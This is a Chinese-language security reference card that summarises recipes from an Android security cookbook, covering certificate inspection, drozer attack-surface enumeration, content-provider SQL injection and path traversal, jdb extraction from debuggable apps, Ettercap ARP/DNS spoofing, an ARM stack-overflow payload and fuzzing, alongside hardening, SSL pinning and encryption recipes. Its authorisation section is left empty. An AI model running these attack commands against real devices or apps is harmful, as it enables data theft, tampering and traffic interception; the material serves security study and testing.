- **方法论的使用**: Android content provider 的 `query(Uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)` 中，`selection` 直接拼进 SQL WHERE 子句、`projection` 拼进 SELECT 子句。若开发者用 `db.rawQuery(...)` 字符串拼接而非参数化，攻击者可注入 `--selection "1=1"` 让 WHERE 恒真返回全表。作者强调审计时也要看 projection——「projection，selection，selectionArgs 以及 sortOrder 这些变量没有一个是直接来自外部 app 的。如果 content provider 是导出的, 而且被典予了 URI 权限，或者像我们前面看到的那样，不需要任何权限，这也就意味着攻击者可以注入任意的 SQL 语句」。
- **结果**: 【亲历】作者演示 `--selection "1=1"` 让银行交易表全量返回（11 行 from_account/to_account/amount，Page 133）；展示含漏洞源码片段 `cursor = sdbh.query(projection, selection, selectionArgs, sortOrder)`（Page 132）

### 示例 8: 利用可调试 app 通过 jdb 提取类与字段
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 4 章「4.11 利用可调试的app」（Page 134–138）
- **问题/输入**: 目标 app `debuggable=true`；JDK 装在本机；USB 调试开启
- **方法论的使用**: manifest 中 `android:debuggable="true"` 的 app 在启动时 Dalvik/ART 会打开 JDWP（Java Debug Wire Protocol）端口。`adb jdwp` 列出设备上所有 JDWP 端口 PID；`adb forward tcp:PORT jdwp:PID` 把它映射到本机；`jdb -attach localhost:PORT` 接入后即可用 `classes` / `methods <class>` / `fields <class>` 反射式枚举 app 内存中所有类、方法、字段值。作者警告「在谷歌应用商店里的一些 app 仍然被标记为可调试」——开发者常忘记在 release 构建里关掉它。姜饼人（Android 2.3）及更低版本的 Dalvik 会在 ADB 未运行时也主动连 JDWP，使恶意 app 能远程执行任意代码。
- **结果**: 【亲历】作者演示 Wall Street Journal Reader（`wsj.reader_sp`）在 Google Play 上以 `debuggable=true` 发布，权限含 `READ_LOGS`/`RESTART_PACKAGES` 等（Page 135）；演示 `com.example.readmycontacts` 调试中提取 MainActivity 字段

## A2 — 相邻能力 (Adjacency)

1. 出现「检查 APK 证书」这类信号时，回到本卡查对应单元的方法与判据。
2. 出现「提取 Android 签名指纹」这类信号时，回到本卡查对应单元的方法与判据。
3. 出现「cert.rsa keytool」这类信号时，回到本卡查对应单元的方法与判据。
4. 出现「APK 公钥 怎么看」这类信号时，回到本卡查对应单元的方法与判据。
5. 出现「check android app signature」这类信号时，回到本卡查对应单元的方法与判据。
6. 出现「重签 APK」这类信号时，回到本卡查对应单元的方法与判据。

语言信号：「检查 APK 证书」、「提取 Android 签名指纹」、「cert.rsa keytool」、「APK 公钥 怎么看」、「check android app signature」、「重签 APK」

本卡为增补材料，正式能力卡请优先读：`attack-surface-scoping`、`component-exposure-and-exploitation`。

**相邻区分（原文）**：

- 与 CU-02「重签」区分——本单元只读证书元数据，不修改 APK
- 与 CU-01 区分——CU-01 只读不改，本单元改写签名；与 CU-14「运行时验证签名」区分——本单元是攻击侧，CU-14 是防御侧
- 与 CU-03 区分——CU-03 静态读 manifest，本单元直接问 PackageManager 拿运行时导出状态；与 CU-06 区分——本单元只枚举不触发
- 与 CU-05 区分——CU-05 枚举，本单元触发；与 CU-10 区分——本单元投递 intent，CU-10 注入 SQL
- 与 CU-10 区分——本单元读/写/遍历文件，CU-10 注入 SQL
- 与 CU-12「Ettercap MITM」区分——本单元被动嗅探，CU-12 主动 ARP 欺骗
- 与 CU-13「参数化防注入」区分——本单元是攻击侧，CU-13 是防御侧
- 与 CU-15「检测调试标志位反逆向」区分——本单元是攻击侧利用，CU-15 是防御侧检测

## E — 执行步骤 (Execution)

### 用 keytool 与 openssl 提取 APK 证书指纹与公钥信息

1. `cp Contacts.apk Contacts.zip && unzip Contacts.zip` → 解压后能看到 `META-INF/` 目录
  2. `keytool -Printcert -file META-INF/CERT.RSA` → 拿到 Owner / Issuer / Serial / Validity / MD5 / SHA1 指纹
  3. `openssl pkcs7 -inform DER -in META-INF/CERT.RSA -noout -print_certs -text` → 补全公钥模数、签名算法、X509v3 扩展
  4. 对比已知恶意 app 指纹库或同一开发者其他 app 指纹 → 判定是否同源

### 删除原签名后用 jarsigner 给 APK 重新签名

1. `unzip Contacts.zip` 后 `rm -r [解压目录]/META-INF` → 删除原签名
  2. `keytool -genkey -v -keystore releasekey.keystore -alias keyalias -keyalg RSA -keysize 2048 -validity 10000` → 生成 keystore（Android 官方推荐 validity > 10000 天）
  3. `jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore releasekey.keystore Contacts.apk keyalias` → 写入新的 `META-INF/`
  4. `adb install Contacts.apk` 安装验证 → 系统接受即说明重签成功

### drozer app.package.attacksurface 枚举设备组件攻击面

1. `drozer console connect` 进入 `dz>` 提示符
  2. `run app.package.list -f facebook` 按名过滤包；`run app.package.info -a com.android.browser` 查单包详情；`run app.package.info -P android.permission.INTERNET` 按权限反查
  3. `run app.activity.info` / `run app.service.info` / `run app.broadcast.info` / `run app.provider.info` 列各组件
  4. 加 `--Permission null` 找无权限保护的导出组件；加 `-u` 含未导出
  5. `run app.package.attacksurface <pkg>` 一次拿到攻击面摘要

### drozer 投递 intent 触发导出组件（activity/service/broadcast）

1. 用 CU-05 找目标包的导出组件 + 其 intent-filter 的 action/category
  2. `run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity`
  3. `run app.service.start --component com.linkedin.android com.linkedin.android.authenticator.AuthenticationService --action android.accounts.AccountAuthenitcator`
  4. `run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234567890 --extra string message PWNED`
  5. 同时开 `adb logcat` 观察组件响应与泄漏

### drozer app.provider 数据提取、插入与路径遍历

1. `run app.provider.info --Permission null` 找无权限 provider
  2. `run app.provider.finduri com.android.providers.downloads` 抓 URI
  3. `run app.provider.query content://settings/secure` 读数据
  4. `run app.provider.columns content://com.mwr.example.sieve.DBContentProvider/Passwords` 列字段
  5. `run app.provider.download content://vulnerabledatabase/../../../system/etc/hosts /tmp/hostsFileExtracted.txt` 路径遍历
  6. `run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords --int _id 3 --string username injected --string service injected --string password woopwoop --string email myspam@gmail.com` 篡改数据

### 用 ADB port forward + tcpdump + netcat + Wireshark 嗅探 Android 流量

1. `adb shell` 后 `su; mkdir /data/tcpdump/; chmod 755 /data/tcpdump/`
  2. `adb push tcpdump /data/tcpdump/. && adb shell chmod 755 /data/tcpdump/tcpdump`
  3. 设备端 `/data/tcpdump/tcpdump -w - | nc -l -p 31337`
  4. PC 端 `adb forward tcp:12345 tcp:31337`
  5. PC 端 `adb forward tcp:12345 tcp:31337 && netcat 127.0.0.1 12345 | wireshark -k -S -i -`

### drozer SQL 注入 content provider（selection 与 projection）

1. 用 CU-07 找到无权限 provider + URI
  2. `run app.provider.query content://com.example.vulnerabledatabase.contentprovider/statements --selection "1=1"` 测试 selection 注入——返回全表即有漏洞
  3. 试 `--selection "0=0"` / `--selection "(1+random())*10 > 1"` 等恒真式确认
  4. 试 projection 注入：`run app.provider.query <URI> --projection "* FROM sqlite_master--"`
  5. 读 sqlite_master 拿全部表结构

### 利用可调试 app 通过 jdb 提取类与字段

1. `run app.package.debuggable` 列出所有可调试 app + 其权限
  2. `run app.activity.start --component <pkg> <activity>` 启动目标 app
  3. `adb jdwp` 拿 JDWP 端口 PID
  4. `adb forward tcp:31337 jdwp:<PID>`
  5. `jdb -attach localhost:31337`
  6. `classes` / `methods com.example.readmycontacts.MainActivity` / `fields com.example.readmycontacts.MainActivity` 提取敏感字段（口令、API token、登录令牌）

### 用 Ettercap ARP 欺骗 + DNS spoof 对 app 做中间人攻击

1. `sudo aptitude install ettercap-graphical`
  2. `sudo vim /usr/share/ettercap/etter.dns` 添加 `*.linkedin.com A <attacker IP>` 等条目
  3. 设置 Android 设备 IP 与网关 IP（设置 → Wi-Fi → 网络名 → IP 地址）
  4. `sudo ettercap -T -i wlan0 -M ARP:remote -P dns_spoof /<gateway_ip>/ /<android_ip>/`
  5. 在设备上打开目标 app，观察是否被重定向到攻击者服务器

### 用 exported=false + 定制权限 + path-permission 加固组件

1. 在 `res/values/strings.xml` 加 `<string name="custom_permission_label">Custom Permission</string>`
  2. manifest 加 `<permission android:name="android.permission.CUSTOM_PERMISSION" android:protectionLevel="signature" ...>`
  3. 不需共享的组件 `<activity android:exported="false">`；需共享的 `<activity android:permission="android.permission.CUSTOM_PERMISSION">`
  4. content provider：`<provider android:readPermission="X" android:writePermission="Y">` + `<path-permission android:path="/Keys" android:readPermission="READ_KEYS" android:writePermission="WRITE_KEYS">`
  5. 共享 app 在其 manifest 加 `<uses-permission android:name="android.permission.CUSTOM_PERMISSION"/>`

### 用 SQLiteStatement 参数化语句防 SQL 注入

1. DAO 类编译期预编译：`private static String INSERT_SQL = "insert into " + TABLE_NAME + " (content, link, title) values (?,?,?)"; insertStatement = db.compileStatement(INSERT_SQL);`
  2. 插入时 `insertStatement.bindString(1, item.getContent()); insertStatement.bindString(2, item.getLink()); insertStatement.bindString(3, item.getTitle()); return insertStatement.executeInsert();`
  3. 查询时 `db.query(TABLE_NAME, null, COL_TITLE + " LIKE ?", new String[] { "%" + searchTerm + "%" }, null, null, null);`

### 运行时验证 app 签名 + 检测模拟器/调试/安装程序反逆向

1. `keytool -list -v -keystore your_app.keystore` 拿 SHA1，去冒号存为 `private static String CERTIFICATE_SHA1 = "71920AC9486E087DCBCF5C7F6FEC95213585BCC5";`
  2. 实现 `validateAppSignature(Context)`：取签名 → `calcSHA1` → `equalsIgnoreCase` 比对
  3. 实现 `isEmulator()`：反射 `android.os.SystemProperties` 取三个属性任一匹配即返回 true
  4. 实现 `isDebuggable(Context)`：检查 `FLAG_DEBUGGABLE`
  5. 实现 `checkGooglePlayStore(Context)`：`getInstallerPackageName` 以 `com.google.android` 开头才放行
  6. 在 app 入口 activity 调用上述检测，检测失败时擦除 SharedPreferences / 退出 / 上报 Google Analytics「tamper」事件

### 用 ProGuard -assumenosideeffects 删日志 + DexGuard API 隐藏与字符串加密

1. 启用 ProGuard：Eclipse `project.properties` 取消注释 `proguard.config=...`；Android Studio Gradle `release { runProguard true; proguardFile ... }`
  2. 写 `LogWrap` 类包装 `Log.e/w/i/d/v`，全工程用 `LogWrap.e(msg)` 替代 `Log.e(TAG, msg)`
  3. `proguard-project.txt` 加 `-assumenosideeffects class android.util.Log { ... }`
  4. 启用优化：`proguard.config=${sdk.dir}/tools/proguard/proguard-android-optimize.txt:proguard-project.txt`
  5. release 构建：`ant release` 或 `gradle assembleRelease`
  6. （DexGuard 商用）`dexguard-project.txt` 加 `-encryptstrings class com.packt.android.security.Constants { public static final java.lang.String CERTIFICATE_SHA1; }` 和 `-accessthroughreflection class com.packt.android.security.Tamper { boolean verifyAppSignature (Context); }`

### 用 baksmali 反编译 DEX 到 smali 并解读 Dalvik 字节码

1. 从 https://bitbucket.org/JesusFreke/smali/downloads 下 `baksmali-[version].jar` 改名为 `baksmali.jar`，配套 wrapper 脚本加 PATH
  2. `baksmali Example.dex` → 生成 `out/Example.smali`
  3. 读 `.class` / `.super` / `.source` 三行元数据
  4. 对每个 `.method`：先看 `.registers N` 确定寄存器数，再看 `invoke-*` / `sget-object` / `const-*` 序列
  5. 对照 Dalvik 字节码官方定义（`source.android.com/devices/tech/dalvik/dalvik-bytecode.html`）逐条解读

### 用 Dex2Jar + JD-GUI 反编译 DEX 回 Java + objdump 反编译 native .so

1. `dex2jar Example.dex` → 生成 `Example_dex2jar.jar`
  2. `jd-gui` 启动 GUI，打开 JAR 文件浏览 Java 源码
  3. File → Save All Sources 导出 .java
  4. 反编译 native：`[NDK]/toolchains/arm-linux-androideabi-[version]/prebuilt/[arch]/bin/arm-linux-androideabi-objdump -D libfoo.so | less`

### 用 BKS truststore + 自定义 X509TrustManager 验证自签名 SSL 证书

1. `openssl s_client -showcerts -connect server.domain:443 </dev/null` 抓 BEGIN/END CERTIFICATE 段存为 `mycert.crt`
  2. `export CLASSPATH=libs/bcprov-jdk15on-149.jar`
  3. `keytool -import -v -trustcacerts -alias 0 -file <(openssl x509 -in mycert.crt) -keystore customtruststore.bks -storetype BKS -providerclass org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath libs/bcprov-jdk15on-149.jar -storepass androidcookbook`
  4. 复制 `customtruststore.bks` 到 `res/raw/`
  5. 写 `loadKeyStore()`：`KeyStore.getInstance("BKS")` + `getResources().openRawResource(R.raw.customtruststore)` + `load(inputStream, STORE_PASSWORD.toCharArray())`
  6a. 写 `LocalTrustStoreMyHttpClient extends DefaultHttpClient` 重写 `createClientConnectionManager()` 注册 `new SSLSocketFactory(loadKeyStore())`
  7b. 或写 `LocalTrustStoreTrustManager implements X509TrustManager`：构造时 `TrustManagerFactory.getInstance(defaultAlgorithm).init(localTrustStore)`，`checkServerTrusted` 委托给内部 `mTrustManager`
  8. `SSLContext.getInstance("TLS").init(null, new TrustManager[]{new LocalTrustStoreTrustManager(loadKeyStore())}, new SecureRandom())`，`HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory())`

### 用公钥 SHA1 pin 实现 SSL pinning

1. 编写 `CalcPins.java`：`SSLContext.getInstance("TLS").init(null, new TrustManager[]{new PublicKeyExtractingTrustManager()}, null)` + `factory.createSocket(host, port).startHandshake()`
  2. `javac CalcPins.java && java -cp . CalcPins android.com:443` → 输出链中每张证书公钥的 SHA1 hash
  3. 复制 hash 到 app：`private static String[] pins = new String[]{ "B3A3B5195E7C0D39B8FA68D41A64780F79FD4EE9", "43DAD630EE53F8A980CA6EFD85F46AA37990E0EA", "C07A98688D89FBAB05640C117DAA7D65B8CACC4E" };`
  4. 实现 `PubKeyPinningTrustManager(pins)`：`validateCertificatePin` 取 `cert.getPublicKey().getEncoded()` 算 SHA1 → hex → `equalsIgnoreCase` 比对
  5. `SSLContext sslContext = SSLContext.getInstance("TLS"); sslContext.init(null, new TrustManager[]{new PubKeyPinningTrustManager(pins)}, null);`
  6. `HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory())`

### 用 find -perm 找危险权限文件（setuid / 全可写 / 全可执行）

1. `adb shell` 后 `find / -perm -4111 -exec ls -al {} \; 2>/dev/null` 找所有 setuid 文件——出现 `su` 即设备已 root
  2. `find / -perm 0222 -exec ls -al {} \; 2>/dev/null` 找全可写文件（潜在注入点）
  3. `find / -perm -2111 -exec ls -al {} \; 2>/dev/null` 找 setgid 文件
  4. `ls -al /data/data/` 看 app UID 命名约定 `u0_aXXX`，UID = XXX + 10000
  5. `find /data/data/ -user 10170 -exec ls -al {} \; 2>/dev/null` 找某 app 拥有的所有文件
  6. `find . -perm [mode] -exec stat -c "%A %u %g %f %N" {} \;` 格式化输出

### 用 NDK 交叉编译原生可执行程序并去除 stack-protector

1. 建目录 `buffer-overflow/jni/`
  2. `jni/Android.mk`：`LOCAL_PATH := $(call my-dir); include $(CLEAR_VARS); LOCAL_MODULE := buffer-overflow; LOCAL_SRC_FILES := buffer-overflow.c; include $(BUILD_EXECUTABLE)`
  3. `jni/buffer-overflow.c`：含 `void vulnerable(char *src){ char dest[10]; strcpy(dest, src); printf("[%s]\n", dest); }` 与 `void call_me_maybe(){ printf("so much win!!\n"); }`
  4. `[NDK]/ndk-build` 编译，产物在 `obj/local/armeabi/buffer-overflow`
  5. 备份 `cp setup.mk setup.mk.bk`，编辑 `[NDK]/toolchains/arm-linux-androideabi-[ver]/setup.mk` 删除 `-fstack-protector`
  6. 重新 `ndk-build`
  7. `[NDK]/toolchains/arm-linux-androideabi-[ver]/prebuilt/linux-x86_64/bin/arm-linux-androideabi-objdump -D obj/local/armeabi/buffer-overflow | less`
  8. `/` 搜 `<vulnerable>`，确认 prologue 已无 stack canary 加载/校验指令

### 利用 ARM 栈溢出覆盖 LR 控制返回地址

1. 用 CU-22 制备去 stack-protector 的 `buffer-overflow` 二进制，push 到设备 `/system/bin/`
  2. `gdbserver :31337 buffer-overflow AAAA` 启动调试；PC 端 `adb forward tcp:31337 tcp:31337; arm-linux-androideabi-gdb` + `target remote :31337`
  3. `disass vulnerable` 看 `push {r0,r1,r2,r3,r4,lr}` 与 `pop {pc}` 确认 LR 在栈上
  4. `break *0x000084d6`（strcpy 调用前）+ `break *0x000084da`（strcpy 调用后）
  5. `continue` 到第一个断点，`x/32xw $sp` 看原始 LR 值（如 `0x000084ed`）
  6. `continue` 到第二个断点，再 `x/32xw $sp` 看输入如何覆盖 LR——记录覆盖 LR 1 字节所需输入长度（如 16 字节）
  7. `disass main` 找要跳转的目标地址（如跳过 printf 到 `0x000084fc`）
  8. 构造 payload：`echo -e "1234567890123456\xfc\x84"`（小端序逆序），喂给程序——`you lose...` 不再打印即控制流被劫持

### 交叉编译 Radamsa + bash 脚本 fuzzing dexdump

1. `sudo apt-get install gcc curl`，`curl http://ouspg.googlecode.com/files/radamsa-0.3.tar.gz > radamsa-0.3.tar.gz; tar -zxvf radamsa-0.3.tar.gz`
  2. `cd radamsa-0.3; mkdir jni; cp radamsa.c jni/; cp <CU-22 的 Android.mk> jni/` 改 `LOCAL_MODULE := radamsa-0.3; LOCAL_SRC_FILES := radamsa.c`
  3. 编辑 `jni/radamsa.c` 第 3222 行 `in_addr_t` → `unsigned long`；第 2686 行注释掉 typedef
  4. `ndk-build` → `libs/armeabi/radamsa-0.3`
  5. `adb push libs/armeabi/radamsa-0.3 /system/bin/radamsa`
  6. 装 BusyBox：从 benno.id.au/Android/busybox 下，`adb push busybox /data/busybox/; /data/busybox --install`
  7. 写 fuzzing 脚本 `/data/fuzz.sh`（含上述 for 循环）
  8. `/data/busybox/bash; /data/busybox/source /data/fuzz.sh Example.dex 100`

### 用 PBKDF2 推导 AES 密钥 + SQLCipher 加密 SQLite 数据库

1. **生成 AES 密钥**：`SecureRandom random = new SecureRandom(); KeyGenerator gen = KeyGenerator.getInstance("AES"); gen.init(256, random); SecretKey key = gen.generateKey();`
  2. **生成 IV**：`byte[] ivByteArray = new byte[32]; new SecureRandom().nextBytes(ivByteArray); IvParameterSpec iv = new IvParameterSpec(ivByteArray);`
  3. **加密**：`Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); cipher.init(Cipher.ENCRYPT_MODE, key, iv); byte[] cipherText = cipher.doFinal(plainText.getBytes("UTF-8"));`
  4. **PBE 推导**：`byte[] salt = new byte[32]; new SecureRandom().nextBytes(salt); SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1"); SecretKey key = skf.generateSecret(new PBEKeySpec(password.toCharArray(), salt, 10000, 256));`
  5. **SQLCipher**：`libs/` 加 sqlcipher JAR + `assets/` 加 icudt46l.zip + `libs/armeabi/` 加原生库；`SQLiteDatabase.loadLibs(context); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase("my_data.db", password, null); db.execSQL("create table MyTable(a, b)");`
  6. Android 4.4+ 用 `PBKDF2WithHmacSHA1And8bit` 保持 Unicode 口令兼容

### 用 DeviceAdminReceiver 强制设备加密与超时锁屏策略

1. `res/xml/admin_policy_encryption_and_lock_timeout.xml`：`<device-admin><uses-policies><force-lock/><encrypted-storage/></uses-policies></device-admin>`
  2. 写 `AppPolicyReceiver extends DeviceAdminReceiver`：`onEnabled` 调 `controller.enforceTimeToLock(context)` + `controller.shouldPromptToEnableDeviceEncryption(context)`；`onDisabled` 擦 SharedPreferences；`onDisableRequested` 返回警告文案
  3. manifest 加 `<receiver android:name=".AppPolicyReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN"><meta-data android:name="android.app.device_admin" android:resource="@xml/admin_policy_encryption_and_lock_timeout"/><intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>...</intent-filter></receiver>`
  4. `AppPolicyController.isDeviceAdminActive(context)`：`DevicePolicyManager.isAdminActive(appPolicyReceiver)`
  5. `getEnableDeviceAdminIntent(context)`：构造 `Intent(ACTION_ADD_DEVICE_ADMIN).putExtra(EXTRA_DEVICE_ADMIN, appPolicyReceiver)`
  6. `enforceTimeToLock(context)`：`devicePolicyManager.setMaximumTimeToLock(appPolicyReceiver, 3 * 60 * 1000)`
  7. `shouldPromptToEnableDeviceEncryption(context)`：`getStorageEncryptionStatus() == ENCRYPTION_STATUS_INACTIVE` 时返回 true
  8. 入口 activity `onCreate` 检查 admin active 状态，未激活则 `startActivityForResult(getEnableDeviceAdminIntent, ENABLE_DEVICE_ADMIN_REQUEST_CODE)`；激活后调 `enforceTimeToLock` + 必要时 `startActivityForResult(getEnableDeviceEncryptionIntent, ENABLE_DEVICE_ENCRYPT_REQUEST_CODE)`

### 统一判停条件

- 单元「失败模式」里列出的任一条件成立时停止该路径，换维度重查；
- OCR 文本不可读、引用无法核对时，只作线索，不写入结论；
- 连续三次同类验证无结果时回到攻击面/问题定义重排优先级。

## B — 失效与边界 (Boundary)

- **用 keytool 与 openssl 提取 APK 证书指纹与公钥信息**：APK 经过了重新签名时 `META-INF/` 会被替换，原证书指纹丢失；Android 不强制 CA 链验证，作者明确警告「任何人都可以用他自己的密钥对 app 签名, 从而声称自己开发了推特(Twitter) 的 app」——仅看 Owner 字段不可靠
- **删除原签名后用 jarsigner 给 APK 重新签名**：用了已过期 / validity 过短的密钥，系统安装时会拒绝；私钥泄漏后任何人都能以你的身份签名 —— 作者强调"如果真打算在实际工作中使用这个密钥存储器，还请把它存放到一个安全的地方"
- **drozer app.package.attacksurface 枚举设备组件攻击面**：权限反查返回的是 `uses-permission` 声明的 app，不等于实际使用了该 API——需结合静态扫描确认；drozer 默认只列 exported=true 的组件，非导出组件需加 `--unexported`
- **drozer 投递 intent 触发导出组件（activity/service/broadcast）**：OCR 文本提示某些默认系统 service 收到空数据 intent 会空指针崩溃——如 `app.service.start --component com.android.systemui com.android.systemui.PhoneSettingService` 会让 System UI 崩溃（DoS），「这个空数据的 intent 就可能逐级引发一个非常复杂的，风险性相当高的漏洞链」；非导出组件需 root
- **drozer app.provider 数据提取、插入与路径遍历**：PATTERN_LITERAL 匹配只精确匹配字面路径，加 `/` 或 `../` 即可绕过——Sieve 的 `/Keys` 路径保护就是这样被绕过的；OCR 文本提到 Adobe Reader、Shazam、WinZip 都有过真实路径遍历 CVE
- **用 ADB port forward + tcpdump + netcat + Wireshark 嗅探 Android 流量**：OCR 文本中端口编号有几处笔误（译者注指出 `tcp:313372`、`tcp 12345` 等），照抄会错——以实际映射关系为准；Android 4.4+ 的 SELinux 可能阻止 root 进程读 `/data/tcpdump/`，需调策略
- **drozer SQL 注入 content provider（selection 与 projection）**：drozer 模块对 projection 注入的反馈不如 selection 直观，需手动判断返回行数；某些 provider 用 `query(...)` 内置 API 而非 `rawQuery`，参数化已自动生效，注入不奏效
- **利用可调试 app 通过 jdb 提取类与字段**：仅看 `debuggable` 字面值不够——某些加固方案会在运行时清除该标志位但 JDWP 端口仍开；Android 4.4+ 的 ART 比 Dalvik 更严格，部分 `fields` 输出可能为空
- **用 Ettercap ARP 欺骗 + DNS spoof 对 app 做中间人攻击**：目标 app 做了 SSL pinning（CU-19）时 HTTPS 连接会因证书不匹配而失败——但作者警告许多 app「在 SSL 验证失败时直接忽略异常」；ARP 欺骗在交换网络可能被动态 ARP 检测（DAI）阻断
- **用 exported=false + 定制权限 + path-permission 加固组件**：`protectionLevel="normal"` 会被自动授予，等同于无保护——敏感操作必须 `signature` 或 `dangerous`；`<grant-uri-permission>` 在 provider 级使用等于完全不设权限，作者强烈建议「无论如何不要在 provider 上使用 URI 授权，只能在各个 path 级上使用它」
- **用 SQLiteStatement 参数化语句防 SQL 注入**：绑定索引与 SQL 列顺序必须严格对应——`INSERT_SQL` 中 content/link/title 对应索引 1/2/3，搞错会写错列；`selection` 用 `LIKE ?` 时通配符 `%` 要放在 `selectionArgs` 里，不能拼进 `selection`
- **运行时验证 app 签名 + 检测模拟器/调试/安装程序反逆向**：作者明确指出局限性——「签名证书的 hash 是被写死在.apk 文件里的，所以一个逆向工程老手是能够仔细分析这个.apk 文件，把这个 SHA1 hash 替换成新证书的 hash 的 … 对 verifyAppSignature 方法的调用也可以被完全删除掉」；模拟器检测可被 Frida/Xposed hook 绕过；需配合 CU-15 DexGuard 加固检测代码
- **用 ProGuard -assumenosideeffects 删日志 + DexGuard API 隐藏与字符串加密**：ProGuard 仅混淆不能防逆向——「逆向还是有可能完成的。所以自然不能把它当作软件安全的唯一屏障」；`-assumenosideeffects` 误用会删掉有副作用的代码，必须只针对 `android.util.Log`；反射 API 在不同 Android 版本可能变化；作者明确指出 iSECPartners 的 `android-ssl-bypass` 库专门绕 SSL pinning，DexGuard 也不能完全防住
- **用 baksmali 反编译 DEX 到 smali 并解读 Dalvik 字节码**：反射机制、非标准 DEX 变形指令会让 baksmali 输出难以阅读——作者警告「除非你理解了 DEX 代码的实际运作方式，否则你就将一直是你的 DEX 反编译器的奴隶」；不同 Android 版本字节码会有新增指令
- **用 Dex2Jar + JD-GUI 反编译 DEX 回 Java + objdump 反编译 native .so**：Dex2Jar 对混淆/反射/非标准 DEX 输出会缺失或错误——必须配合 CU-17 baksmali 阅读原始字节码交叉验证；JD-GUI 对 Java 8+ lambda 编译产物反编译质量下降；objdump 输出量极大，需 `| less` 翻页 + `/` 搜索函数名定位
- **用 BKS truststore + 自定义 X509TrustManager 验证自签名 SSL 证书**：「如果后端服务器证书发生变更，app 将不再信任这一连接，并会抛出 SecurityException 异常」——需在证书轮换前发版更新 truststore；truststore 保护口令用硬编码写死不是安全问题（truststore 内是公钥证书），但作者建议用 DexGuard 字符串加密再加固一层
- **用公钥 SHA1 pin 实现 SSL pinning**：作者明确指出局限性——「SSLpinning，会使中间人(MITM)攻击变得更为困难,但它还不是一个万无一失的解决方案」；iSECPartners 的 `android-ssl-bypass` 库专为绕 SSL pinning 而写，需配合 CU-14 防篡改 + CU-15 DexGuard 隐藏 `validateCertificatePin` 方法；每次连接都验证 pin 有性能影响，可只在会话首次握手检查（但牺牲安全性）
- **用 find -perm 找危险权限文件（setuid / 全可写 / 全可执行）**：OCR 文本指出「不同的厂商为他们的设备专门编译的 Android 版本之间还会有不同」——厂商常误用文件路径，不能只看 AOSP 默认权限；`-perm 0444` 精确匹配会漏掉 `0644` 等更宽松权限，审计时应用 `-perm -444`（匹配 r 位被设）更全面
- **用 NDK 交叉编译原生可执行程序并去除 stack-protector**：OCR 文本警告「你的 NDK 使用的可能是不同版本的 arm-linux-androideabi … 如果下面的步骤不起作用，你应该自行尝试其他删除栈保护值的方法」；NDK r10+ 把 setup.mk 拆分，需找正确的 setup.mk；删除 `-fstack-protector` 后所有 NDK 编译的可执行文件都会失去保护，仅在受控实验环境用
- **利用 ARM 栈溢出覆盖 LR 控制返回地址**：ASLR 会让栈地址每次运行变化——需 `setarch arm -R` 或在模拟器关闭 ASLR；精确覆盖长度依赖编译器优化级别，每次重编译都要重测；作者指出「栈溢出未必是 Android 中出现最多的 bug」但「是通往更高级的漏洞利用技术的必经之路」
- **交叉编译 Radamsa + bash 脚本 fuzzing dexdump**：不同 Radamsa 版本行号不同，需搜 `in_addr_t` 定位；dexdump 路径需在 PATH 中或脚本里写绝对路径；返回码判断 `>127` 只捕获信号杀死，逻辑 bug 不会触发；fuzzing 可能产生海量 crash 样本，需去重
- **用 PBKDF2 推导 AES 密钥 + SQLCipher 加密 SQLite 数据库**：**绝对不能给 SecureRandom 设种子**——作者专门警告「`secureRandom.setSeed(myCustomSeed)` … 使得用 SecureRandom 生成密钥，以期增强安全性的努力全都白费了」；2013 年 8 月 Android 4.1–4.3 的 PRNG bug（比特币钱包被攻破）——种子用 null 初始化导致可预测，需打 Google 公布的 `applyPRNGFixes` 补丁；SQLCipher 默认 4000 次迭代（低于推荐 10000），可调；truststore 口令硬编码可被 DexGuard 加密
- **用 DeviceAdminReceiver 强制设备加密与超时锁屏策略**：用户无法卸载作为设备管理员的 app——必须先取消授权再卸载；用户取消授权时 `onDisabled` 触发，应擦除敏感数据；Android 4.4+ 才支持 `<uses-feature>` 中声明可选设备管理特性用于 Play 过滤

### 授权与合规边界

> 待补充（用户自行填写）
